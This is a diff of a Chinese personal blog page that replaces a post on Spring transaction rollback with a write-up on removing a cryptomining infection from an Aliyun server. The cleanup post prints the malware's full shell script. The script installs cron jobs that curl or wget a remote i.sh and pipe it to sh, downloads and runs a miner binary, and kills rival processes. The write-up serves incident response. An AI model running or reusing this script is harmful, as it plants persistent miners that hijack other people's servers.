@@ -115,25 +115,28 @@
 
 
 
-  <meta name="description" content="转：https://blog.csdn.net/yipanbo/article/details/46048413为了打印清楚日志，很多方法我都加tyr catch，在catch中打印日志。但是这边情况来了，当这个方法异常时候 日志是打印了，但是加的事务却没有回滚。例：类似这样的方法不会回滚 （一个方法出错，另一个方法不会回滚） ：12345678if(userSave)&amp;#123;">
-<meta name="keywords" content="java">
+  <meta name="description" content="记一次阿里云挖矿程序清除经历最近两天阿里云不断发邮件通知我，告知服务器疑似陪挖矿程序利用。所以登上服务器看了下。   1、首先执行top命令，查看进程执行情况。如图：就是红框中的两个鬼玩意儿：Jonason、mhssfa4   2、然后呢，执行top -c命令，可以看到执行文件在哪里。这一步忘了截图了，不过记得是反映出执行文件是/usr/bin/mhssfa*。   3、所以果断停掉上面的两个进程">
+<meta name="keywords" content="Linux">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Spring事务异常回滚">
-<meta property="og:url" content="https://CharloWang.github.io/2018/03/10/Spring事务异常回滚/index.html">
+<meta property="og:title" content="记一次阿里云挖矿程序清除经历">
+<meta property="og:url" content="https://CharloWang.github.io/2019/09/21/阿里云挖矿病毒清除/index.html">
 <meta property="og:site_name" content="一只不正经的小程序猿">
-<meta property="og:description" content="转：https://blog.csdn.net/yipanbo/article/details/46048413为了打印清楚日志，很多方法我都加tyr catch，在catch中打印日志。但是这边情况来了，当这个方法异常时候 日志是打印了，但是加的事务却没有回滚。例：类似这样的方法不会回滚 （一个方法出错，另一个方法不会回滚） ：12345678if(userSave)&amp;#123;">
+<meta property="og:description" content="记一次阿里云挖矿程序清除经历最近两天阿里云不断发邮件通知我，告知服务器疑似陪挖矿程序利用。所以登上服务器看了下。   1、首先执行top命令，查看进程执行情况。如图：就是红框中的两个鬼玩意儿：Jonason、mhssfa4   2、然后呢，执行top -c命令，可以看到执行文件在哪里。这一步忘了截图了，不过记得是反映出执行文件是/usr/bin/mhssfa*。   3、所以果断停掉上面的两个进程">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-11-19T15:38:10.018Z">
+<meta property="og:image" content="https://charlowang.github.io/2019/09/21/阿里云挖矿病毒清除/img/aliyun_wakuang/top_pic.png">
+<meta property="og:image" content="https://charlowang.github.io/2019/09/21/阿里云挖矿病毒清除/img/aliyun_wakuang/crontab_pic.png">
+<meta property="og:updated_time" content="2019-09-21T15:28:37.798Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Spring事务异常回滚">
-<meta name="twitter:description" content="转：https://blog.csdn.net/yipanbo/article/details/46048413为了打印清楚日志，很多方法我都加tyr catch，在catch中打印日志。但是这边情况来了，当这个方法异常时候 日志是打印了，但是加的事务却没有回滚。例：类似这样的方法不会回滚 （一个方法出错，另一个方法不会回滚） ：12345678if(userSave)&amp;#123;">
+<meta name="twitter:title" content="记一次阿里云挖矿程序清除经历">
+<meta name="twitter:description" content="记一次阿里云挖矿程序清除经历最近两天阿里云不断发邮件通知我，告知服务器疑似陪挖矿程序利用。所以登上服务器看了下。   1、首先执行top命令，查看进程执行情况。如图：就是红框中的两个鬼玩意儿：Jonason、mhssfa4   2、然后呢，执行top -c命令，可以看到执行文件在哪里。这一步忘了截图了，不过记得是反映出执行文件是/usr/bin/mhssfa*。   3、所以果断停掉上面的两个进程">
+<meta name="twitter:image" content="https://charlowang.github.io/2019/09/21/阿里云挖矿病毒清除/img/aliyun_wakuang/top_pic.png">
 
 
 
 
 
 
-  <link rel="canonical" href="https://CharloWang.github.io/2018/03/10/Spring事务异常回滚/">
+  <link rel="canonical" href="https://CharloWang.github.io/2019/09/21/阿里云挖矿病毒清除/">
 
 
 
@@ -143,7 +146,7 @@
   };
 </script>
 
-  <title>Spring事务异常回滚 | 一只不正经的小程序猿</title>
+  <title>记一次阿里云挖矿程序清除经历 | 一只不正经的小程序猿</title>
   
 
 
@@ -342,7 +345,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://CharloWang.github.io/2018/03/10/Spring事务异常回滚/">
+    <link itemprop="mainEntityOfPage" href="https://CharloWang.github.io/2019/09/21/阿里云挖矿病毒清除/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Charlo">
@@ -359,7 +362,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Spring事务异常回滚
+          <h1 class="post-title" itemprop="name headline">记一次阿里云挖矿程序清除经历
               
             
           </h1>
@@ -384,24 +387,12 @@
                 
               
 
-              <time title="创建时间：2018-03-10 00:00:00" itemprop="dateCreated datePublished" datetime="2018-03-10T00:00:00+08:00">2018-03-10</time>
+              <time title="创建时间：2019-09-21 00:00:00 / 修改时间：23:28:37" itemprop="dateCreated datePublished" datetime="2019-09-21T00:00:00+08:00">2019-09-21</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-11-19 23:38:10" itemprop="dateModified" datetime="2018-11-19T23:38:10+08:00">2018-11-19</time>
               
             
           </span>
@@ -441,11 +432,14 @@
       
 
       
-        <p>转：<a href="https://blog.csdn.net/yipanbo/article/details/46048413" target="_blank" rel="noopener">https://blog.csdn.net/yipanbo/article/details/46048413</a><br>为了打印清楚日志，很多方法我都加tyr catch，在catch中打印日志。但是这边情况来了，当这个方法异常时候 日志是打印了，但是加的事务却没有回滚。<br>例：<br>类似这样的方法不会回滚 （一个方法出错，另一个方法不会回滚） ：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(userSave)&#123;          </span><br><span class="line">    <span class="keyword">try</span> &#123;         </span><br><span class="line">        userDao.save(user);          </span><br><span class="line">        userCapabilityQuotaDao.save(capabilityQuota);         </span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123;          </span><br><span class="line">        logger.info(<span class="string">"能力开通接口，开户异常，异常信息："</span>+e);         </span><br><span class="line">     &#125;         </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
-<p>或者：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(userSave)&#123;          </span><br><span class="line">    <span class="keyword">try</span> &#123;         </span><br><span class="line">        userDao.save(user);          </span><br><span class="line">        userCapabilityQuotaDao.save(capabilityQuota);         </span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123;          </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"能力开通接口，开户异常，异常信息："</span>+e);         </span><br><span class="line">     &#125;         </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
-<p>下面的方法回滚（一个方法出错，另一个方法会回滚）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(userSave)&#123;         </span><br><span class="line">     <span class="keyword">try</span> &#123;          </span><br><span class="line">        userDao.save(user);          </span><br><span class="line">        userCapabilityQuotaDao.save(capabilityQuota);         </span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;         </span><br><span class="line">        logger.info(<span class="string">"能力开通接口，开户异常，异常信息："</span>+e);          </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();         </span><br><span class="line">     &#125;          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>或者：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(userSave)&#123;          </span><br><span class="line">    <span class="keyword">try</span> &#123;          </span><br><span class="line">        userDao.save(user);          </span><br><span class="line">        userCapabilityQuotaDao.save(capabilityQuota);          </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;          </span><br><span class="line">        logger.info(<span class="string">"能力开通接口，开户异常，异常信息："</span>+e);          </span><br><span class="line">        TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();         </span><br><span class="line">    &#125;         </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
-<p>为什么不会滚呢？？是对Spring的事务机制就不明白。！！<br>默认spring事务只在发生未被捕获的 runtimeexcetpion时才回滚。<br>spring aop  异常捕获原理：被拦截的方法需显式抛出异常，并不能经任何处理，这样aop代理才能捕获到方法的异常，才能进行回滚，默认情况下aop只捕获runtimeexception的异常，但可以通过配置来捕获特定的异常并回滚。换句话说在service的方法中不使用try catch 或者在catch中最后加上throw new runtimeexcetpion（），这样程序异常时才能被aop捕获进而回滚。<br>解决方案：<br>方案1.例如service层处理事务，那么service中的方法中不做异常捕获，或者在catch语句中最后增加throw new RuntimeException()语句，以便让aop捕获异常再去回滚，并且在service上层（webservice客户端，view层action）要继续捕获这个异常并处理。<br>方案2.在service层方法的catch语句中增加：TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();语句，手动回滚，这样上层就无需去处理异常（现在项目的做法）。<br>方案3：（推荐）<br>在所在的方法上加上rollbackFor ,形如：@Transactional(readOnly = true, rollbackFor = Exception.class)。</p>
+        <h1 id="记一次阿里云挖矿程序清除经历"><a href="#记一次阿里云挖矿程序清除经历" class="headerlink" title="记一次阿里云挖矿程序清除经历"></a>记一次阿里云挖矿程序清除经历</h1><p>最近两天阿里云不断发邮件通知我，告知服务器疑似陪挖矿程序利用。所以登上服务器看了下。  </p>
+<p>1、首先执行<code>top</code>命令，查看进程执行情况。如图：<br><img src="img/aliyun_wakuang/top_pic.png" alt=""><br>就是红框中的两个鬼玩意儿：Jonason、mhssfa4  </p>
+<p>2、然后呢，执行<code>top -c</code>命令，可以看到执行文件在哪里。这一步忘了截图了，不过记得是反映出执行文件是<code>/usr/bin/mhssfa*</code>。  </p>
+<p>3、所以果断停掉上面的两个进程Jonason、mhssfa4，然后删除<code>/usr/bin/mhssfa*</code>。  </p>
+<p>4、之后也就没管理了，<font color="red">但是！！！！</font>过一会儿这个挖矿程序又起来了，TMD！！！直觉上是这鬼玩意儿有定时任务在执行，<br>删除了<code>/usr/bin/mhssfa*</code>后，它自己又重建了。  </p>
+<p>5、又按照上面的步骤走了一遍，然后检查了一下系统的定时任务。命令是：<code>crontab -l</code>，如图：<br><img src="img/aliyun_wakuang/crontab_pic.png" alt=""><br>从图中可以看出，确实是有一个任务在从远端服务器上下载挖矿程序，每15分钟从服务器上拉一次程序。这台服务器在<code>印度尼西亚万丹</code>。好吧，<br>终于抓住它了，所以直接删除掉这个任务。命令是：<code>crontab -r</code>。  </p>
+<p>6、执行完以上步骤后，挖矿程序就被清除了。  </p>
+<p>以下是它的脚本：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">mkdir -p /var/spool/cron/crontabs</span><br><span class="line">echo "" &gt; /var/spool/cron/root</span><br><span class="line">echo "*/15 * * * * (/usr/bin/aiyufa4||/usr/libexec/aiyufa4||/usr/local/bin/aiyufa4||/tmp/aiyufa4||curl -fsSL -m180 http://103.**.**.66:8000/i.sh||wget -q -T180 -O- http://103.**.**.66:8000/i.sh) | sh" &gt;&gt; /var/spool/cron/root</span><br><span class="line">cp -f /var/spool/cron/root /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line">cd /tmp</span><br><span class="line">touch /usr/local/bin/writeable &amp;&amp; cd /usr/local/bin/</span><br><span class="line">touch /usr/libexec/writeable &amp;&amp; cd /usr/libexec/</span><br><span class="line">touch /usr/bin/writeable &amp;&amp; cd /usr/bin/</span><br><span class="line">rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:$(pwd)</span><br><span class="line">ps auxf | grep -v grep | grep aiyufa4 || rm -rf aiyufa4</span><br><span class="line">if [ ! -f "aiyufa4" ]; then</span><br><span class="line">    curl -fsSL -m1800 http://103.**.**.66:8000/static/4004/ddgs.$(uname -m) -o aiyufa4||wget -q -T1800 http://103.**.**.66:8000/static/4004/ddgs.$(uname -m) -O aiyufa4</span><br><span class="line">fi</span><br><span class="line">chmod +x aiyufa4</span><br><span class="line">/usr/bin/aiyufa4||/usr/libexec/aiyufa4||/usr/local/bin/aiyufa4||/tmp/aiyufa4</span><br><span class="line"></span><br><span class="line">ps auxf | grep -v grep | grep aiyubcb | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep aiyubcc | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep aiyubcd | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep aiyubce | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep aiyufa0 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep aiyufa1 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep aiyufa2 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line"></span><br><span class="line">echo "*/15 * * * * (/usr/bin/aiyufa4||/usr/libexec/aiyufa4||/usr/local/bin/aiyufa4||/tmp/aiyufa4||curl -m180 -fsSL http://103.**.**.66:8000/i.sh||wget -q -T180 -O- http://103.**.**.66:8000/i.sh) | sh" | crontab -</span><br></pre></td></tr></table></figure></p>
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
       
     </div>
@@ -493,7 +487,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"> java</i></a>
+            <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"> Linux</i></a>
           
         </div>
       
@@ -506,8 +500,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/12/10/深度优先搜索和广度优先搜索/" rel="next" title="深度优先搜索和广度优先搜索">
-                <i class="fa fa-chevron-left"></i> 深度优先搜索和广度优先搜索
+              <a href="/2019/08/31/Java IO操作/" rel="next" title="Java IO操作">
+                <i class="fa fa-chevron-left"></i> Java IO操作
               </a>
             
           </div>
@@ -515,10 +509,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/06/25/RabbitMQ安装/" rel="prev" title="RabbitMQ安装">
-                RabbitMQ安装 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -563,8 +553,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -671,6 +670,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#记一次阿里云挖矿程序清除经历"><span class="nav-number">1.</span> <span class="nav-text">记一次阿里云挖矿程序清除经历</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
